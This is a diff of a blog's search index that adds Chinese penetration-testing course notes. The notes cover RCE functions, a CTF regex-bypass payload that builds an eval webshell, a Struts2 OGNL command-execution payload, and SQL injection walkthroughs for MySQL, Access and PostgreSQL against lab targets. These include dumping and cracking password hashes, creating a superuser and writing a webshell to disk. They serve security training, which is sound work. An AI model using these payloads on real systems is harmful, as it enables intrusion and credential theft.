@@ -1,6 +1,328 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>31-35、渗透测试(xiaodi)</title>
+    <url>/2021/08/10/31-35%E3%80%81%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-xiaodi/</url>
+    <content><![CDATA[<p>31、RCE代码命令执行&amp;Php&amp;Py&amp;Java</p>
+<p>#RCE漏洞详细点：</p>
+<ul>
+<li>漏洞场景：代码会调用自身的脚本代码执行（代码执行漏洞），也会调用系统命令执行（系统执行漏洞）</li>
+<li>代码执行<ul>
+<li>和脚本语言有关：php/java/python/js</li>
+</ul>
+</li>
+<li>命令执行<ul>
+<li>和操作系统有关：windows/linux/mac</li>
+</ul>
+</li>
+<li>漏洞对象：WEB源码&amp;中间件&amp;其他环境（见漏洞详情对象）</li>
+<li>漏洞危害：直接权限丢失</li>
+</ul>
+<span id="more"></span>
+
+<p>#漏洞函数：</p>
+<ul>
+<li>1.PHP：<ul>
+<li>eval()：把字符串当作代码执行</li>
+<li>assert()、preg_replace()、call_user_func()、call_user_func_array()以及array_map()等</li>
+<li>system、shell_exec、popen、passthru、proc_open等</li>
+</ul>
+</li>
+<li>2.Python：<ul>
+<li>eval exec subprocess os.system commands </li>
+</ul>
+</li>
+<li>3.Java：<ul>
+<li>Java中没有类似php中eval函数这种直接可以将字符串转化为代码执行的函数，</li>
+<li>但是有反射机制，并且有各种基于反射机制的表达式引擎，如: OGNL、SpEL、MVEL等.</li>
+</ul>
+</li>
+</ul>
+<p>#案例1-各种语言类型-代码执行&amp;命令执行</p>
+<ul>
+<li>PHP,Javaweb,Python</li>
+</ul>
+<p>#案例2-未知漏洞利用-功能点&amp;代码块&amp;黑白盒</p>
+<ul>
+<li><p>1.功能点-[ACTF2020 新生赛]Exec-黑盒</p>
+<ul>
+<li><a href="https://blog.csdn.net/liucy007/article/details/90209277">https://blog.csdn.net/liucy007/article/details/90209277</a></li>
+</ul>
+</li>
+<li><p>2.代码块-[极客大挑战 2019]RCE ME-白盒</p>
+<ul>
+<li>```php<br>#CTF 绕过正则表达式过滤#此处是分析代码，根据代码的过滤规则，构造我们的payloadphp -r “echo urlencode(<del>‘phpinfo’);”?code=(</del>%8F%97%8F%96%91%99%90)();<?php error_reporting(0);$a='assert';$b=urlencode(~$a);echo $b;echo "<br>";$c='(eval($_POST[xd]))';$d=urlencode(~$c);echo $d;?>?code=(<del>%9E%8C%8C%9A%8D%8B)(</del>%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%87%9B%A2%D6%D6);<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">\#案例3-已知漏洞利用-Struts2&amp;Webmin&amp;Fastjson</span><br><span class="line"></span><br><span class="line">- 核心思想：直接根据网上的文章进行复现即可</span><br><span class="line"></span><br><span class="line">- 难点：网上的复现，仅仅展示了rce的存在，但是它复现中的命令执行无关痛痒，比如 ls 命令</span><br><span class="line"></span><br><span class="line">  - 既然可以命令执行，我们完全可以将ls命令换成其他命令，比如 通过echo命令写入一句话到一个php文件，然后连接即可</span><br><span class="line"></span><br><span class="line">- [GitHub - zhzyker/vulmap: Vulmap 是一款 web 漏洞扫描和验证工具, 可对 webapps 进行漏洞扫描, 并且具备漏洞验证功能](https://github.com/zhzyker/vulmap)</span><br><span class="line"></span><br><span class="line">- cve漏洞合集：https://github.com/nomi-sec/PoC-in-GitHub/</span><br><span class="line"></span><br><span class="line">- Struts2&amp;Webmin&amp;Fastjson</span><br><span class="line"></span><br><span class="line">  - ```</span><br><span class="line">    %23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&amp;pp=%5C%5CA&amp;ppp=%20&amp;encoding=UTF-8&amp;cmd=cat key.txtuser=root&amp;pam=1&amp;expired=2&amp;old=123456;ls&amp;new1=11&amp;new2=11对比st2代码命令执行-javaweb代码段学习掌握漏洞详情及漏洞利用过程利用</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+</ul>
+<p>#案例4-RCE执行拓展-后门工具控制&amp;功能绕过原理</p>
+<ul>
+<li>菜刀&amp;蚁剑&amp;冰蝎&amp;哥斯拉&amp;大马等原理及绕过解析<ul>
+<li>原理：我们插入一句话后，有个密码，而菜刀这些webshell工具为什么能够查看目录或者进行其他的一些操作，本质就是通过这个密码，来传递一些命令执行的数据，首先这些工具会将一些组合的命令，通过各种编码，加密，然后通过密码（也可以说是变量）传到一句话木马里执行</li>
+</ul>
+</li>
+</ul>
+<p>发现一处命令执行的页面，但是只能执行特定的命令咋办？比如只能执行ping命令</p>
+<ul>
+<li>可以通过百度搜索“多条命令执行”，里面会有多条命令执行的一些连接符，这里推荐适用分号（；），分号代表着无论分号前面的语句是否执行成功，后面的语句都会执行，所以我们可以在ping命令后面加上分号，然后再拼接其他的命令，即可命令执行</li>
+</ul>
+<p>怎么发现rce？</p>
+<ul>
+<li>黑盒<ul>
+<li>从功能点发现，比如某个页面就是执行ping命令的界面，那么很明显，这就是命令执行</li>
+<li>从url上的关键字出发，有的url里有关键字，eval，system()等关键字，那么这里也有可能存在rce</li>
+</ul>
+</li>
+<li>白盒<ul>
+<li>代码审计</li>
+</ul>
+</li>
+</ul>
+]]></content>
+      <categories>
+        <category>笔记</category>
+      </categories>
+      <tags>
+        <tag>渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>9-12、渗透测试学习笔记(xiaodi)</title>
+    <url>/2021/08/10/9-12%E3%80%81%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-xiaodi/</url>
+    <content><![CDATA[<p>9、加密编码进制WEB&amp;系统&amp;代码</p>
+<p>目的：看到一串密文，能识别它是什么加密，并且将其解密</p>
+<p>常用场景：</p>
+<ul>
+<li>url里的参数被加密了，我们注入的时候也必须将payload进行进行加密才能进行注入<ul>
+<li>墨者靶场地址：<a href="https://www.mozhe.cn/bug/detail/SjRRVFpOQWlLWDBJd3hzNGY5cFBiQT09bW96aGUmozhe">SQL注入漏洞测试(参数加密)_数据库安全_在线靶场_墨者学院_专注于网络安全人才培养 (mozhe.cn)</a><span id="more"></span></li>
+</ul>
+</li>
+<li>对一个网站进行请求的时候，有的一些敏感参数进行加密了，我们必须解密才能懂每个参数的意思</li>
+<li>网站的账户和密码一般都被加密了，所以就算我们通过手段获取到了密码，也没用，必须要将密码解密才有用<ul>
+<li>有的密码加密还带了salt（盐），所以想解密这种md5，也必须要获取到salt是多少才行，不过一般数据库里也会存储salt，可以获取到去解密网站进行解密</li>
+</ul>
+</li>
+<li>代码审计：有的代码被解密了，所以必须将其解密了才能代码审计</li>
+<li>windows账户密码解密：NTLM、Hash、SHA</li>
+</ul>
+<p>解密网站大全：</p>
+<ul>
+<li><a href="https://blog.csdn.net/qq_41638851/article/details/100526839">CTF中常见密码题解密网站总结_Greedy Hat的博客-CSDN博客</a></li>
+</ul>
+<p>密文加密特征：</p>
+<ul>
+<li><a href="https://mp.weixin.qq.com/s?__biz=MzAwNDcxMjI2MA==&mid=2247484455&idx=1&sn=e1b4324ddcf7d6123be30d9a5613e17b&chksm=9b26f60cac517f1a920cf3b73b3212a645aeef78882c47957b9f3c2135cb7ce051c73fe77bb2&mpshare=1&scene=23&srcid=1111auAYWmr1N0NAs9Wp2hGz&sharer_sharetime=1605145141579&sharer_shareid=5051b3eddbbe2cb698aedf9452370026#rd">30余种加密编码类型的密文特征分析（建议收藏） (qq.com)</a></li>
+</ul>
+<p>常用工具：</p>
+<ul>
+<li>迪哥发的里面的：超级加解密转换工具</li>
+</ul>
+<h2 id="10、WEB-amp-系统-amp-APP-amp-服务漏洞权限认知"><a href="#10、WEB-amp-系统-amp-APP-amp-服务漏洞权限认知" class="headerlink" title="10、WEB&amp;系统&amp;APP&amp;服务漏洞权限认知"></a>10、WEB&amp;系统&amp;APP&amp;服务漏洞权限认知</h2><p>不同的脚本语言适用的漏洞也不同</p>
+<ul>
+<li>例如sql漏洞在php里比较多，在java里就很少了（php的一般是php格式，java的一般是jsp格式的）</li>
+</ul>
+<p>不同的中间件也适用于不同的漏洞</p>
+<ul>
+<li>比如Glassfish就只在java里有</li>
+</ul>
+<p>权限(从低到高)</p>
+<ul>
+<li>后台</li>
+<li>数据库权限</li>
+<li>web权限</li>
+<li>系统权限</li>
+<li>内网权限</li>
+</ul>
+<h2 id="11-、信息收集实战"><a href="#11-、信息收集实战" class="headerlink" title="11 、信息收集实战"></a>11 、信息收集实战</h2><p>基本流程：</p>
+<ul>
+<li>判断有无cdn或者waf<ul>
+<li>违法类网站或者小网站一般无cdn</li>
+</ul>
+</li>
+<li>cms识别、中间件识别<ul>
+<li>cms识别可以在搜索引擎搜索该网站的特有的url关键字</li>
+<li>看有无历史漏洞</li>
+</ul>
+</li>
+<li>whois和备案查询，网站页面的联系方式，比如qq，根据页面公司或者标志前往搜索引擎搜索关键字，查找它的其他网站</li>
+<li>根据上一步获取的信息前往搜索引擎，或者fofa获取更多的资产</li>
+<li>收集子域名</li>
+<li>敏感文件扫描，有waf就放慢速度<ul>
+<li>可对收集到的大量的子域名进行批量扫描</li>
+</ul>
+</li>
+<li>查找登录的页面或者支付接口，然后根据获取的qq或者手机号去纸飞机查询历史密码，若历史密码不正确，则可以根据查询到的历史密码里的关键字制作成字典进行爆破</li>
+</ul>
+<h2 id="12-、SQL注入-amp-超级靶场-amp-函数-amp-可控变量"><a href="#12-、SQL注入-amp-超级靶场-amp-函数-amp-可控变量" class="headerlink" title="12 、SQL注入&amp;超级靶场&amp;函数&amp;可控变量"></a>12 、SQL注入&amp;超级靶场&amp;函数&amp;可控变量</h2><p>函数：决定可能存在什么漏洞，比如数据库查询函数，则可能存在SQL注入</p>
+<p>可控变量：变量是否可控决定此处是否存在漏洞，如果变量被写死了，则不存在漏洞</p>
+<p>检测是否存在sql注入：</p>
+<p>本质：就是对一个参数比如id=1  后面随便加乱七八糟的字符，当然如果是字符型，一定要闭合单引号，否则乱加的数据都会当作字符串进行执行了只要页面和不加之前保持一致，那么就不存在注入，因为这代表加的字符没有带入查询，如果带入查询，我们乱加的字符一定会导致页面和不加之前不一致</p>
+<ul>
+<li>原始方式<ul>
+<li>and 1=1 页面正常</li>
+<li>and 1=2 页面错误</li>
+<li>则表示存在注入</li>
+</ul>
+</li>
+</ul>
+<p>数据库查询代码样例分析</p>
+<ul>
+<li><pre><code class="php">&lt;?php
+header(&quot;Content-Type: text/html; charset=utf-8&quot;);
+//$s=&#39;O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;s:2:&quot; 2&quot;;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;s:2:&quot;xd&quot;;&#125;&#39;;
+//var_dump(unserialize($s));
+//var_dump(scandir(&quot;.&quot;));
+
+$id=$_GET[&#39;id&#39;];
+$idx=$_GET[&#39;x&#39;];
+$idpage=$_GET[&#39;page&#39;];//接受参数名为id赋值给变量id
+if(!is_integer($id))&#123;
+    $conn=mysql_connect(&#39;localhost&#39;,&#39;root&#39;,&#39;root&#39;);//连接数据库
+    mysql_select_db(&#39;javaweb-bbs&#39;,$conn);//选择数据库名为javaweb-bss的数据库
+    $sql=&quot;select * from sys_article where id = $id&quot;;//组合定义SQL语句
+    echo $sql.&#39;&lt;hr&gt;&#39;;//输出变量sql
+    $result=mysql_query($sql);//执行变量sql里的SQL语句
+    if($row=mysql_fetch_array($result))&#123; //对执行的结果进行显示
+        echo $row[&#39;title&#39;].&#39;&lt;hr&gt;&#39;;
+        echo $row[&#39;content&#39;].&#39;&lt;hr&gt;&#39;;
+    &#125;
+else&#123;
+    echo &quot;fuck&quot;;
+&#125;
+&#125;
+</code></pre>
+</li>
+</ul>
+<p>sql过滤：</p>
+<ul>
+<li>关键字过滤<ul>
+<li>比如过滤union、update，and等</li>
+</ul>
+</li>
+<li>类型过滤<ul>
+<li>过滤数字类型</li>
+<li>过滤字符类型</li>
+</ul>
+</li>
+</ul>
+<p>get注入时，url存在注入的条件：</p>
+<ul>
+<li>url里必须要有参数</li>
+</ul>
+<p>数据库结构</p>
+<ul>
+<li>mysql数据库<ul>
+<li>数据库A = 网站A<ul>
+<li>表名<ul>
+<li>列名<ul>
+<li>数据</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>数据库B=网站B<ul>
+<li>表名<ul>
+<li>列名<ul>
+<li>数据</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>数据库C=网站C<ul>
+<li>表名<ul>
+<li>列名<ul>
+<li>数据</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>union联合注入</p>
+<ul>
+<li><p>判断参数是什么类型</p>
+<ul>
+<li>如果是字符型，则需要闭合单引号(原始代码 ‘$id’)，并且查询语句后面还需要加上 –+来注释掉剩下的单引号</li>
+<li>如果是数字型，则不需要</li>
+</ul>
+</li>
+<li><p>查询长度：order by 3  </p>
+<ul>
+<li>如果实际长度超过3，就会报错，</li>
+</ul>
+</li>
+<li><p>联合查询</p>
+<ul>
+<li>union select 1,2,3  <ul>
+<li><a href="http://127.0.0.1/sqli-labs-master/Less-1/index.php?id=-1%27union%20select%20%201,2,3--+">http://127.0.0.1/sqli-labs-master/Less-1/index.php?id=-1%27union%20select%20%201,2,3--+</a></li>
+<li><img src="/source/images/image-20210729095857024.png" alt="image-20210729095857024"></li>
+</ul>
+</li>
+<li>易错点：如果页面没有回显，需要将union前面的语句变成false，比如1改为-1</li>
+</ul>
+</li>
+<li><p>开始查询</p>
+<ul>
+<li><p>在回显位置的参数处插入想查询的内容，比如database()</p>
+<ul>
+<li>127.0.0.1/sqli-labs-master/Less-1/index.php?id=-1’union select  1,database(),user()–+)</li>
+<li><img src="/source/images/image-20210729095938429.png" alt="image-20210729095938429"></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>多参数注入：http//:127.0.0.1/1.php?a=3&amp;id=16</p>
+<ul>
+<li><p>假设扫描出来参数a存在注入</p>
+<ul>
+<li><p>应该怎么手工？</p>
+<ul>
+<li>直接在参数a的值后面拼接sql语句，比如：http//:127.0.0.1/1.php?a=3 and 1=2&amp;id=16</li>
+</ul>
+</li>
+<li><p>应该怎么用sqlmap？</p>
+<ul>
+<li>直接将存在注入的参数剪切下来拼接到最后面（这样不影响访问）：python3 sqlmap.py -u “http//:127.0.0.1/1.php?id=16&amp;a=3”     </li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>sqli-labs靶场搭建</p>
+<ul>
+<li>下载：<a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a></li>
+<li>解压：解压会提示重名，我们只需要打开压缩包，然后将里面的文件夹拖出来即可</li>
+<li>修改连接配置文件：sqli-labs-master\sql-connections\db-creds.inc<ul>
+<li>将密码修改为：$dbpass =’root’;</li>
+</ul>
+</li>
+<li>浏览器访问：127.0.0.1/sqli-labs-master/    ,接着点击：Setup/reset Database for labs<ul>
+<li>如果报错就代表上一步的配置文件没有修改到位</li>
+<li>还有可能就是php的版本不对，应该是图片中的这个php-5.4.45+Apache<ul>
+<li><img src="/source/images/image-20210729094139732.png" alt="image-20210729094139732"></li>
+</ul>
+</li>
+<li>至此，靶场安装完成</li>
+</ul>
+</li>
+</ul>
+]]></content>
+      <categories>
+        <category>笔记</category>
+      </categories>
+      <tags>
+        <tag>渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>github推送新项目</title>
     <url>/2021/08/09/github%E6%8E%A8%E9%80%81%E6%96%B0%E9%A1%B9%E7%9B%AE/</url>
     <content><![CDATA[<p>应用场景：</p>
@@ -156,6 +478,1478 @@
       </categories>
       <tags>
         <tag>python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>13-15、渗透测试(xiaodi)</title>
+    <url>/2021/08/10/13-15%E3%80%81%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-xiaodi/</url>
+    <content><![CDATA[<p>13 、SQL注入&amp;Mysql&amp;Postsql&amp;Access</p>
+<p>1、不同数据库类型差异讲解</p>
+<ul>
+<li>sql查询语句不同</li>
+<li>架构和权限的划分也不同（数据库的用户是高权限用户还是低权限用户）</li>
+</ul>
+<p>2、SQL注入与数据库类型关系</p>
+<p>3、Access&amp;Mysql&amp;PostgreSQL</p>
+<p>4.实战中如何判断当前注入点数据库</p>
+<span id="more"></span>
+
+
+<ul>
+<li>脚本语言组合<ul>
+<li>php   mysql</li>
+<li>asp   access</li>
+</ul>
+</li>
+<li>端口扫描，namp</li>
+</ul>
+<p>sql注入-Fuzz字典使用说明</p>
+<ul>
+<li>适用场景：手工注入、手工+工具注入</li>
+<li>工具和字典<ul>
+<li><a href="https://github.com/sqlmapproject/sqlmap">https://github.com/sqlmapproject/sqlmap</a></li>
+<li><a href="https://github.com/fuzzdb-project/fuzzdb">https://github.com/fuzzdb-project/fuzzdb</a></li>
+</ul>
+</li>
+</ul>
+<p>Access联合&amp;偏移注入</p>
+<ul>
+<li><p>特点：小型的数据库，现在很少见了，一般搭配sap的脚本语言</p>
+</li>
+<li><p>Access数据库架构</p>
+<ul>
+<li>表名<ul>
+<li>列名<ul>
+<li>数据</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>mysql数据库架构</p>
+<ul>
+<li>数据库A = 网站A<ul>
+<li>表名<ul>
+<li>列名<ul>
+<li>数据</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>数据库B=网站B<ul>
+<li>表名<ul>
+<li>列名<ul>
+<li>数据</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>Access数据库和mysql数据库的区别</p>
+<ul>
+<li>根据架构不同，Access只有一个数据库，而mysql有多个数据库，所以Access第一步猜解表名就可以了，而mysql因为有多个数据库，所以第一步是猜解当前数据库的数据库名字</li>
+<li>Access是暴力猜解，所以能否猜解出表名、列名取决于字典的丰富程度，所以经常会导致猜解不出表名、列名的情况，而mysql则不是这样，mysql有一个总的数据库，所有的东西都在里面，都有规律，所以不需要暴力猜解</li>
+</ul>
+</li>
+<li><p>Access联合注入</p>
+<ul>
+<li><p>查字段数： order by 22 </p>
+</li>
+<li><p>开始猜解表名，在 order by 22 后面拼接  from admin    此时这里的admin是我们猜解的表名，如果admin不存在。则会报错</p>
+<ul>
+<li>技巧：这里可以使用burp。将admin设置为变量。然后组合字典进行猜解</li>
+<li>127.0.0.1/Production/PRODUCT_DETAIL.asp?id=1513%20union%20select%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22%20from%20admin</li>
+</ul>
+</li>
+<li><p>开始猜解列名：如果表名猜解出来了的话</p>
+<ul>
+<li>```python<br>#猜解一个字段<br><a href="http://127.0.0.1/Production/PRODUCT_DETAIL.asp?id=1513%20union%20select%201,2,password,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22%20from%20admin">http://127.0.0.1/Production/PRODUCT_DETAIL.asp?id=1513%20union%20select%201,2,password,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22%20from%20admin</a>#猜解2个字段<br><a href="http://127.0.0.1/Production/PRODUCT_DETAIL.asp?id=1513%20union%20select%201,2,admin,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22%20from%20admin">http://127.0.0.1/Production/PRODUCT_DETAIL.asp?id=1513%20union%20select%201,2,admin,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22%20from%20admin</a><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">      </span><br><span class="line"></span><br><span class="line">- Access偏移注入：解决能暴力猜解出表名，但是猜不出列名的情况</span><br><span class="line"></span><br><span class="line">  - 要求：会套用模板即可</span><br><span class="line"></span><br><span class="line">  - 代码：</span><br><span class="line"></span><br><span class="line">    - ```python</span><br><span class="line">      偏移注入：解决表名获取到而列名获取不到情况</span><br><span class="line">      使用方法：</span><br><span class="line">      	1、首先可以观察到一共有22个字段，我们接着使用星号 *  代替22，然后访问该页面，若报错，接着继续往前删掉数字，22 -&gt; 1 一直往前删除，直到页面不报错</span><br><span class="line">          2、此处发现，删除到16的时候，页面正常，相当于 * 号占了6个位置</span><br><span class="line">          3、接着使用第三条语句开始二级偏移，* from (admin as a inner join admin as b on a.id = b.id)   ，并且接着继续往前删除6个数字，这里就是删到10，然后查看页面和源代码，看字段的值有没有爆出来，如果没有爆出来，就进行下一步三级偏移</span><br><span class="line">          4、同理，继续往前删除6个数字，组合语句 a.id,b.id,c.id,* from ((admin as a inner join admin as b on a.id = b.id)inner join admin as c on a.id=c.id)   ，查看页面和源代码是否有我们需要的内容爆出</span><br><span class="line">          </span><br><span class="line">          </span><br><span class="line">      union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 from admin</span><br><span class="line">      union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,* from admin</span><br><span class="line">      union select 1,2,3,4,5,6,7,8,9,10,* from (admin as a inner join admin as b on a.id = b.id)</span><br><span class="line">      union select 1,2,3,4,a.id,b.id,c.id,* from ((admin as a inner join admin as b on a.id = b.id)inner join admin as c on a.id=c.id)</span><br><span class="line">      </span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+</ul>
+<p>SQL注入-Mysql高低版本联合注入</p>
+<ul>
+<li><p>常用查询函数</p>
+<ul>
+<li>database()      数据库名</li>
+<li>version()      数据库版本</li>
+<li>user()      数据库用户</li>
+<li>@@version_compile_os  操作系统</li>
+</ul>
+</li>
+<li><p>低版本： &lt;Mysql 5.0  </p>
+<ul>
+<li>特性：属于暴力猜解 ，不带有information_schema ，所以只能暴力猜解</li>
+</ul>
+</li>
+<li><p>高版本</p>
+<ul>
+<li>特性：有规律的猜解，带有数据库名information_schema,其存储着所有的数据库的名字、表名、列名的信息</li>
+<li>查询函数<ul>
+<li>information_schema.tables  下的l列table_name 储存有所有的表名</li>
+<li>information_schema.columns  下的列column_name 储存有所有的列名</li>
+<li>information_schema..schemata 下的schema_name   储存有所有的数据库的名字</li>
+<li>table_schema 数据库名<ul>
+<li>易错点：一定要注意，是table_schema ，并不是schema_name</li>
+</ul>
+</li>
+<li>table_name  表名</li>
+<li>column_name 列名</li>
+</ul>
+</li>
+<li>实例：墨者靶场：<a href="https://www.mozhe.cn/bug/detail/elRHc1BCd2VIckQxbjduMG9BVCtkZz09bW96aGUmozhe">SQL手工注入漏洞测试(MySQL数据库)_SQL注入_在线靶场_墨者学院_专注于网络安全人才培养 (mozhe.cn)</a><ul>
+<li>判断参数是字符型还是数字型：<a href="http://219.153.49.228:43902/new_list.php?id=1%E2%80%99and%201=1">http://219.153.49.228:43902/new_list.php?id=1%E2%80%99and%201=1</a><ul>
+<li>报错，所以不是字符型，那他是数字型</li>
+<li><img src="/source/images/image-20210729122300887.png" alt="image-20210729122300887"></li>
+</ul>
+</li>
+<li>查询长度：<a href="http://219.153.49.228:43902/new_list.php?id=1%20order%20by%204">http://219.153.49.228:43902/new_list.php?id=1%20order%20by%204</a><ul>
+<li>结果为4</li>
+</ul>
+</li>
+<li>联合查询：<a href="http://219.153.49.228:43902/new_list.php?id=-1%20union%20select%201,2,3,4">http://219.153.49.228:43902/new_list.php?id=-1%20union%20select%201,2,3,4</a><ul>
+<li>易错点：需要将union前面的语句置错，比如改成 -1</li>
+<li><img src="/source/images/image-20210729122534689.png" alt="image-20210729122534689"></li>
+</ul>
+</li>
+<li>开始在显示位2的位置sql注入查询数据库版本：<a href="http://219.153.49.228:43902/new_list.php?id=-1%20union%20select%201,version(),3,4">http://219.153.49.228:43902/new_list.php?id=-1%20union%20select%201,version(),3,4</a><ul>
+<li><img src="/source/images/image-20210729122706545.png" alt="image-20210729122706545"></li>
+</ul>
+</li>
+<li>因为是版本大于或等于5.0，所以可以hi用information_schema数据库进行注入</li>
+<li>获取数据库名：<a href="http://219.153.49.228:43902/new_list.php?id=-1%20union%20select%201,2,database(),4">http://219.153.49.228:43902/new_list.php?id=-1%20union%20select%201,2,database(),4</a><ul>
+<li>得到：mozhe_Discuz_StormGroup</li>
+</ul>
+</li>
+<li>获取一个表名：219.153.49.228:43902/new_list.php?id=-1 union select 1,2,table_name,4 from information_schema.tables where table_schema = “mozhe_Discuz_StormGroup”<ul>
+<li><img src="/source/images/image-20210729123659999.png" alt="image-20210729123659999"></li>
+</ul>
+</li>
+<li>获取所有表名：group_concat(table_name)<ul>
+<li>219.153.49.228:43902/new_list.php?id=-1 union select 1,2,group_concat(table_name),4 from information_schema.tables where table_schema = “mozhe_Discuz_StormGroup”</li>
+<li><img src="/source/images/image-20210729124115953.png" alt="image-20210729124115953"></li>
+</ul>
+</li>
+<li>获取所有列名<ul>
+<li>这里根据上面查到的表，可以发现表StormGroup_member是存储用户数据的，所以我们就获取它里面的列</li>
+<li><a href="http://219.153.49.228:43902/new_list.php?id=-1">http://219.153.49.228:43902/new_list.php?id=-1</a> union select 1,2,group_concat(column_name),4 from information_schema.columns where table_schema = “mozhe_Discuz_StormGroup”</li>
+<li>易错点：这里因为information_schema.columns里储存了所有的列，所以需要将information_schema.tables换成information_schema.columns</li>
+<li><img src="/source/images/image-20210729124808993.png" alt="image-20210729124808993"></li>
+</ul>
+</li>
+<li>获取数据：<a href="http://219.153.49.228:43902/new_list.php?id=-1">http://219.153.49.228:43902/new_list.php?id=-1</a> union select 1,password,name,4 from StormGroup_member<ul>
+<li>易错点：这里直接填上字段，然后后面跟上from + 表名即可</li>
+<li><img src="/source/images/image-20210729125307489.png" alt="image-20210729125307489"></li>
+</ul>
+</li>
+<li>密码进行md5解密，得到：mozhe   738426<ul>
+<li>注意，因为这个获取到的账号被禁用了，所以我们可以使用group_concat()获取所有的账户和密码，发现第二个账户和密码可以成功登录</li>
+<li><a href="http://219.153.49.228:43902/new_list.php?id=-1">http://219.153.49.228:43902/new_list.php?id=-1</a> union select 1,group_concat(password),group_concat(name),4 from StormGroup_member</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>SQL注入-PostgreSQL同理联合注入：和mysql类似</p>
+<ul>
+<li><p>特性：</p>
+<ul>
+<li><p>select 的1,2,3,4   全部换成null</p>
+</li>
+<li><p>select null,null,null,null   并不会显示显示位，而是页面正常显示，所以在插入查询语句，比如version() 需要在4个null的位置进行测试，看哪个位置会爆出数据（前提：union前面的语句要置错）</p>
+</li>
+</ul>
+</li>
+<li><p>语法：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Postgresql是一款中小型数据库，经常与PHP一起使用。</span><br><span class="line"></span><br><span class="line">数据库判断</span><br><span class="line">+<span class="keyword">and</span>+<span class="number">1</span>::<span class="built_in">int</span>=<span class="number">1</span>-</span><br><span class="line">返回正常即为Postgresql数据库</span><br><span class="line"></span><br><span class="line">常用注入语句</span><br><span class="line">数据库版本</span><br><span class="line">+<span class="keyword">and</span>+<span class="number">1</span>=cast(version() <span class="keyword">as</span> <span class="built_in">int</span>)-</span><br><span class="line">判断当前用户</span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>=cast(user||<span class="number">123</span> <span class="keyword">as</span> <span class="built_in">int</span>)</span><br><span class="line">判断字段数</span><br><span class="line">order by</span><br><span class="line">联合注入</span><br><span class="line">用法和oracle相似</span><br><span class="line"></span><br><span class="line">数据库版本信息</span><br><span class="line">union select null,version(),null </span><br><span class="line">用户权限</span><br><span class="line">union select null,current_schema(),null</span><br><span class="line">数据库名称</span><br><span class="line">union select null,current_database(),null</span><br><span class="line">表名</span><br><span class="line">union select null,relname,null <span class="keyword">from</span> pg_stat_user_tables</span><br><span class="line">列名</span><br><span class="line">union select null,column_name,null <span class="keyword">from</span> information_schema.columns where table_name=<span class="string">&#x27;表名&#x27;</span></span><br><span class="line">查看数据库账号密码</span><br><span class="line">union select null,usename|char(<span class="number">124</span>)|passwd,null <span class="keyword">from</span> pg_shadow</span><br><span class="line">||连接字符串</span><br><span class="line"></span><br><span class="line">char(<span class="number">124</span>)为|</span><br><span class="line"></span><br><span class="line">获得结果例子：admin|password</span><br><span class="line"></span><br><span class="line">创建用户</span><br><span class="line">;create user test <span class="keyword">with</span> superuser password <span class="string">&#x27;test&#x27;</span>-- </span><br><span class="line">修改postgres的用户密码为<span class="keyword">pass</span></span><br><span class="line">;alter user postgres <span class="keyword">with</span> password <span class="string">&#x27;pass&#x27;</span></span><br><span class="line">写shell</span><br><span class="line">方法一</span><br><span class="line">依次执行如下三个命令</span><br><span class="line"></span><br><span class="line">;create  table shell(shell text <span class="keyword">not</span> null);</span><br><span class="line">;insert into shell values(一句话木马);</span><br><span class="line">;copy shell(shell) to <span class="string">&#x27;/www/shell.php&#x27;</span>;</span><br><span class="line">这样就会将一句话木马写到，www目录下的shell.php文件中</span><br><span class="line"></span><br><span class="line">方法二</span><br><span class="line">;copy (select <span class="string">&#x27;一句话木马&#x27;</span>) to <span class="string">&#x27;/www/shell/php&#x27;</span>;</span><br><span class="line">读文件</span><br><span class="line">pg_read_file(<span 